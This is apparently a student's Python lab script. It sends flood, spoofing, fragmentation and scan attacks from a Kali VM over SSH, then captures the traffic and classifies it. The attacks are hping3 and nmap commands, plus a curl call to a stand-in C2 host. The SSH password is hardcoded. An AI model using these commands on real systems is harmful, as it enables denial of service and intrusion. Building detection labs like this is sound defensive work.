import subprocess
import time
import paramiko
import pandas as pd
from scapy.all import rdpcap, IP, TCP, UDP
from collections import defaultdict
import ipaddress
import threading


# FUNCIONANDO
# OPÇÃO 1 - IP Spoofing OK
# OPÇÃO 2 - TCP SYN Flood OK
# OPÇÃO 3 - UDP FlooD OK
# OPÇÃO 5 - Fragmentação Suspeita
# OPÇÃO 6 - TTL Alterado OK
# OPÇÃO 7 - TCP SYN Scan OK


# PENDENTE
# OPÇÃO 4 - MAC SPOOFING
# OPÇÃO 8 - RETRANSMISSOES EXCESSIVAS
# OPÇÃO 9 - DNS TUNNELING
# OPÇÃO 10 - dOMINIOS SUSPEITOS
# OPCAO 11 - USER AGENT ANORMAL
# OPÇÃO 12 - TLS HANDSHACK INCOMPLETO ??????




def ip_privado(ip_str):
    try:
        ip_obj = ipaddress.ip_address(str(ip_str).strip())
        redes_privadas = [
            ipaddress.ip_network("10.0.0.0/8"),
            ipaddress.ip_network("172.16.0.0/12"),
            ipaddress.ip_network("192.168.0.0/16"),
        ]
        return any(ip_obj in rede for rede in redes_privadas)
    except ValueError:
        return False

def capturar_pacotes(interface_id, duracao, nome_arquivo):
    print(f"\n[+] Capturando pacotes na interface {interface_id} por {duracao} segundos...")
    subprocess.run([
        r"C:\\Program Files\\Wireshark\\tshark.exe", "-i", interface_id,
        "-a", f"duration:{duracao}", "-w", nome_arquivo, "-F", "pcap"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def analisar_pcap(nome_arquivo):
    try:
        pkts = rdpcap(nome_arquivo)
    except Exception as e:
        print(f"❌ Erro ao abrir arquivo pcap: {e}")
        exit()

    linhas = []
    for pkt in pkts:
        if pkt.haslayer(IP):
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            ip_len = pkt[IP].len
            ttl = pkt[IP].ttl

            src_port = dst_port = tcp_flags = protocolo = None
            if pkt.haslayer(TCP):
                protocolo = 'TCP'
                src_port = pkt[TCP].sport
                dst_port = pkt[TCP].dport
                tcp_flags = pkt[TCP].sprintf("%flags%")
            elif pkt.haslayer(UDP):
                protocolo = 'UDP'
                src_port = pkt[UDP].sport
                dst_port = pkt[UDP].dport
            else:
                protocolo = 'OUTRO'

            if dst_ip.startswith("224.") or (dst_port in [137, 123, 5353]):
                continue

            linhas.append({
                'src_ip': src_ip,
                'dst_ip': dst_ip,
                'src_port': src_port or 0,
                'dst_port': dst_port or 0,
                'ip_len': ip_len,
                'ttl': ttl,
                'tcp_flags': tcp_flags,
                'protocolo': protocolo
            })

    return pd.DataFrame(linhas)

# def classificar_tipo_ataque(pkt):
#     if pkt.get('ttl') is not None and pkt['ttl'] <= 5:
#         return "Ataque: TTL Alterado (Evasão)"
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#     if (pkt['dst_port'] == 53 or pkt['src_port'] == 53) and pkt.get('protocolo') == 'UDP':
#         if pkt['ip_len'] < 80:
#             return "Consulta DNS Pequena"
#     if pkt.get('protocolo') == 'TCP' and pkt.get('tcp_flags') == "S":
#         if not ip_privado(pkt['src_ip']):
#             return "IP Spoofing Externo"
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
#             return "IP Spoofing Interno"
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#     if (pkt['src_port'] == 0 or pkt['dst_port'] == 0) and pkt.get('protocolo') != 'UDP':
#         return "Pacote Malformado"
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#     return "Tipo desconhecido"

def classificar_tipo_ataque(pkt):
    src_ip = pkt.get('src_ip')
    dst_ip = pkt.get('dst_ip')
    src_port = pkt.get('src_port', 0)
    dst_port = pkt.get('dst_port', 0)
    protocolo = pkt.get('protocolo')
    ip_len = pkt.get('ip_len', 0)
    ttl = pkt.get('ttl', 0)
    flags = pkt.get('tcp_flags', "")

    # 7. TTL Alterado suspeito
    if ttl <= 5:
        return "Ataque: TTL Alterado (Evasão)"

    # 11. IP Spoofing Externo
    if protocolo == 'TCP' and flags == "S":
        if not ip_privado(src_ip):
            return "IP Spoofing Externo"

    # 1. Multicast ou broadcast conhecido (SSDP, UPnP)
    if dst_ip.startswith("239.") or dst_ip.startswith("224.") or dst_ip == "255.255.255.255":
        return "Multicast/Broadcast (normal)"

    # 2. Tráfego DNS pequeno (permitir até 10 pacotes por IP)
    if dst_port == 53 or src_port == 53:
        if protocolo == "UDP":
            if ip_len < 80:
                return "Consulta DNS Pequena"
            elif ip_len > 512:
                return "Resposta DNS Grande (talvez Tunneling)"
        return "Tráfego DNS (normal)"

    # 3. Tráfego HTTPS legítimo
    if dst_port == 443 or src_port == 443:
        if ip_len < 80:
            if ip_privado(dst_ip):
                return "TLS Handshake Incompleto"
            else:
                return "TLS Abortado (potencialmente normal)"
        return "Tráfego HTTPS (normal)"


    # 4. HTTP ou HTTPS (normal)
    if dst_port in [80, 443] or src_port in [80, 443]:
        return "HTTP/HTTPS (normal)"

    # 5. DHCP
    if dst_port in [67, 68] or src_port in [67, 68]:
        return "Tráfego DHCP (normal)"

    # 6. NTP
    if dst_port == 123 or src_port == 123:
        return "Tráfego NTP (normal)"

    # 14. Fragmentação suspeita
    if ip_len < 200 and protocolo == "OUTRO":
        return "Fragmentação Suspeita"

    if protocolo == "OUTRO" and ip_len < 200 and (src_port == 0 or dst_port == 0):
        return "Fragmentação Suspeita"



    # 8. TLS Scan suspeito (porta 443 com SYN e TTL baixo)
    if dst_port == 443 and protocolo == "TCP" and flags == "S" and ttl <= 5:
        return "SYN Scan TLS (suspeito)"

    # 9. SSH brute force
    # if dst_port == 22:
    #     # return "Tentativa de Brute Force SSH"
    #     return "SYN Scan SSH (Porta 22)"
    if protocolo == 'TCP' and flags == 'S':
        if dst_port == 22:
            return "SYN Scan SSH (Porta 22)"
        elif dst_port == 443:
            return "TLS Scan (SYN sem TLS)"
        elif dst_port == 80:
            return "HTTP Scan (SYN)"
        elif dst_port < 1024:
            return "SYN Scan em portas conhecidas (<1024)"
        else:
            return "SYN Scan TCP (portas altas)"

    # 🧯 Resposta a SYN Scan: RA sem solicitação anterior
    if protocolo == 'TCP' and flags == 'RA':
        return "Resposta a SYN Scan (RA)"

    # 10. Pacote malformado
    if (src_port == 0 or dst_port == 0) and protocolo != 'UDP':
        return "Pacote Malformado"



    # 12. IP Spoofing Interno (ajuste para evitar falsos positivos)
    # if ip_privado(src_ip) and ip_privado(dst_ip):
    #     if not src_ip.endswith(".1") and not src_ip.endswith(".254"):
    #         return "IP Spoofing Interno"

    # if ip_privado(src_ip) and ip_privado(dst_ip) and protocolo == 'TCP':
    #     if 'S' in flags and 'A' not in flags:
    #         if not src_ip.endswith(".1") and not src_ip.endswith(".254"):
    #             return "IP Spoofing Interno"

    if protocolo == 'TCP' and flags == 'S':
        return "Possível SYN Flood"

    # 13. UDP Flood / Amplificação
    if protocolo == "UDP" and ip_len > 1500:
        return "Flood UDP ou Amplificação"

    # if protocolo == 'TCP' and dst_port == 80 and ip_len < 200:
    #     return "User-Agent Anormal (padrão de scanner)"

    return "Tipo desconhecido"

# def analisar_anomalias(df):
#     if df.empty:
#         print("✅ Nenhum tráfego relevante capturado.")
#         return
#
#     print("\n⚠️ Anomalias detectadas:")
#     ips_spoofados = set()
#     contador_ataques = {}
#     exemplos_ataques = {}
#
#     for _, linha in df.iterrows():
#         tipo = classificar_tipo_ataque(linha)
#         contador_ataques[tipo] = contador_ataques.get(tipo, 0) + 1
#         if tipo not in exemplos_ataques:
#             exemplos_ataques[tipo] = []
#         if len(exemplos_ataques[tipo]) < 5:
#             exemplos_ataques[tipo].append(f"{linha['src_ip']} → {linha['dst_ip']} ({linha['src_port']}→{linha['dst_port']})")
#         if tipo in ["IP Spoofing Interno", "IP Spoofing Externo"]:
#             ips_spoofados.add(linha['src_ip'])
#
#     respostas_indesejadas = sum(1 for _, linha in df.iterrows()
#                                  if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados)
#
#     print("\n📄 Relatório Final:")
#     if contador_ataques:
#         for tipo, qtd in contador_ataques.items():
#             print(f"- {tipo}: {qtd} ocorrência(s)")
#             for exemplo in exemplos_ataques[tipo]:
#                 print(f"    Ex: {exemplo}")
#     else:
#         print("✅ Nenhum ataque detectado.")
#
#     if respostas_indesejadas > 0:
#         print(f"\n⚠️ Respostas indevidas a IPs spoofados: {respostas_indesejadas}")
#     else:
#         print("\n✅ Nenhuma resposta indevida detectada.")
#     print("\n✅ Análise concluída.")

def analisar_anomalias(df):
    if df.empty:
        print("✅ Nenhum tráfego relevante capturado.")
        return
    print("\n⚠️ Anomalias detectadas:")
    # print("\n📡 Pacotes capturados para análise:")
    for _, linha in df.iterrows():
        print(f"  → {linha['protocolo']} | Flags: {linha['tcp_flags']} | {linha['src_ip']} → {linha['dst_ip']}")

    # Agora inicia a contagem real de anomalias
    print("\n⚠️ Anomalias classificadas:")
    ips_spoofados = set()
    respostas_indesejadas = 0
    contador_ataques = {}
    exemplos_ataques = {}
    contador_dns_pequeno = defaultdict(int)
    for _, linha in df.iterrows():
        print(
            f"DEBUG: Flags: {linha['tcp_flags']}, Protocolo: {linha['protocolo']}, SRC: {linha['src_ip']} → DST: {linha['dst_ip']}")
        tipo = classificar_tipo_ataque(linha)
        contador_ataques[tipo] = contador_ataques.get(tipo, 0) + 1
        if tipo not in exemplos_ataques:
            exemplos_ataques[tipo] = []
        if len(exemplos_ataques[tipo]) < 5:
            exemplos_ataques[tipo].append(f"{linha['src_ip']} → {linha['dst_ip']} (Portas {linha['src_port']} → {linha['dst_port']})")
        # if tipo in ["IP Spoofing Interno", "IP Spoofing Externo"]:
        #     ips_spoofados.add(linha['src_ip'])
        if tipo == "IP Spoofing Externo":
            ips_spoofados.add(linha['src_ip'])
        if tipo == "Consulta DNS Pequena":
            chave = linha["src_ip"]
            contador_dns_pequeno[chave] += 1
            if contador_dns_pequeno[chave] > 10:
                tipo = "Ataque: UDP Flood (porta 53)"

    # Agrupamento por IP e contagem de SYN
    contador_syn_por_ip = defaultdict(int)
    for _, linha in df.iterrows():
        if linha['protocolo'] == 'TCP' and linha['tcp_flags'] == 'S':
            contador_syn_por_ip[linha['src_ip']] += 1

    for ip, total in contador_syn_por_ip.items():
        if total > 1000:  # Ajuste esse limiar conforme testes
            tipo = "Ataque: SYN Flood detectado"
            contador_ataques[tipo] = contador_ataques.get(tipo, 0) + total
            exemplos_ataques[tipo] = [f"{ip} → múltiplos destinos (SYN x{total})"]

    # Após processar os pacotes no df
    contador_udp_53 = defaultdict(int)
    for _, linha in df.iterrows():
        if linha['protocolo'] == 'UDP' and linha['dst_port'] == 53:
            contador_udp_53[linha['src_ip']] += 1

    for ip, total in contador_udp_53.items():
        if total > 1000:  # limiar ajustável
            tipo = "Ataque: UDP Flood (porta 53)"
            contador_ataques[tipo] = contador_ataques.get(tipo, 0) + total
            exemplos_ataques[tipo] = [f"{ip} → 192.168.198.131 (x{total})"]

    for _, linha in df.iterrows():
        if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados:
            respostas_indesejadas += 1
    print("\n📄 Relatório Final:")
    if contador_ataques:
        for tipo, quantidade in contador_ataques.items():
            print(f"- {tipo}: {quantidade} ocorrência(s)")
            for exemplo in exemplos_ataques.get(tipo, []):
                print(f"    {exemplo}")
    else:
        print("✅ Nenhum ataque detectado.")
    if respostas_indesejadas > 0:
        print(f"\n⚠️ Respostas indevidas a IPs spoofados: {respostas_indesejadas}")
    else:
        print("✅ Nenhuma resposta indevida detectada.")
    print("\n✅ Análise concluída.")





def executar_ataque(ip_kali, ip_vitima, opcao, ip_spoofado=None, mac_fake=None):
    comandos = {
        "1": f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10",
        "2": f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood",
        # "2": f"echo 'npfnm1msv' | sudo hping3 -S -p 80 --flood {ip_vitima} -S -p 80 --flood",
        # "3": f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}",
        "3": f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 --udp -p 53 --flood {ip_vitima}",
        # "4": (
        #     f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
        #     f"sudo ip link set eth0 address {mac_fake} && "
        #     f"sudo ip link set eth0 up && ping -c 5 {ip_vitima} && "
        #     f"sudo ip link set eth0 down && sudo ip link set eth0 address 00:0c:29:f7:61:06 && sudo ip link set eth0 up"
        # ),
        # "4": (
        #     f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
        #     f"sudo ip link set eth0 address {mac_fake} && "
        #     f"sudo ip link set eth0 up && "
        #     f"curl -I http://{ip_vitima} && "
        #     f"sudo ip link set eth0 down && "
        #     f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
        #     f"sudo ip link set eth0 up"
        # ),
        "5": f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}",
        "6": f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}",
        "7": f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}",
        "8": f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && curl -I http://{ip_vitima} && sudo tc qdisc del dev eth0 root",
        "9": f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done",
        "10": f"dig any comandos.controle.tk && curl http://c2.fake.ru",
        "11": f"curl -A \"FakeScannerBot/9.9 (linux; rootkit)\" http://{ip_vitima}",
        "4": f"timeout 1 openssl s_client -connect {ip_vitima}:443"
    }
    print("🔐 Conectando na VM Kali...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
    comando = comandos.get(opcao)
    if comando:
        print(f"🚀 Executando ataque: {comando}")
        stdin, stdout, stderr = ssh.exec_command(comando)
        print(stdout.read().decode())
        print(stderr.read().decode())
    else:
        print("❌ Opção inválida.")
    ssh.close()

# Execução direta do modo ofensivo
print("\n🔐 Simulador de Ataques:")
print("1️⃣ IP Spoofing\n2️⃣ TCP SYN Flood\n3️⃣ UDP Flood\n4️⃣ TLS Handshake Incompleto\n5️⃣ Fragmentação Suspeita")
print("6️⃣ TTL Alterado\n7️⃣ TCP SYN Scan")

descricao_ataques = {
    "1": "🔎 IP Spoofing",
    "2": "🌊 TCP SYN Flood",
    "3": "📡 UDP Flood",
    "4": "🔐 TLS Handshake Incompleto",
    "5": "🧨 Fragmentação Suspeita",
    "6": "👣 TTL Alterado",
    "7": "🕵️‍♂️ TCP SYN Scan"
}

opcao = input("\nSelecione o tipo de ataque (1-7): ").strip()
descricao = descricao_ataques.get(opcao)
if not descricao:
    print("❌ Opção inválida.")
    exit()

print(f"\n📘 Descrição: {descricao}")
ip_kali = input("🖥️ IP da máquina Kali: ").strip()
ip_vitima = input("🎯 IP da vítima: ").strip()
ip_spoofado = mac_fake = None
if opcao == "1":
    ip_spoofado = input("🎭 IP spoofado: ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC falsificado: ").strip()

# interface_id = "4"
# nome_arquivo = "captura_ataque.pcap"
# capturar_pacotes(interface_id, 30, nome_arquivo)
# executar_ataque(ip_kali, ip_vitima, opcao, ip_spoofado, mac_fake)
# df = analisar_pcap(nome_arquivo)
# analisar_anomalias(df)
interface_id = "4"
nome_arquivo = "captura_ataque.pcap"

# ⏱️ Iniciar tshark em paralelo antes do ataque
threading.Thread(target=capturar_pacotes, args=(interface_id, 15, nome_arquivo)).start()
time.sleep(2)  # tempo para garantir que tshark já está capturando

# 🚀 Executar o ataque via SSH
executar_ataque(ip_kali, ip_vitima, opcao, ip_spoofado, mac_fake)

# ⏳ Aguarda a captura finalizar antes de analisar
time.sleep(16)  # Espera um pouco além do tempo da captura (15s)

# 📊 Analisar os pacotes capturados
df = analisar_pcap(nome_arquivo)
analisar_anomalias(df)
print("\n✅ Simulação concluída.")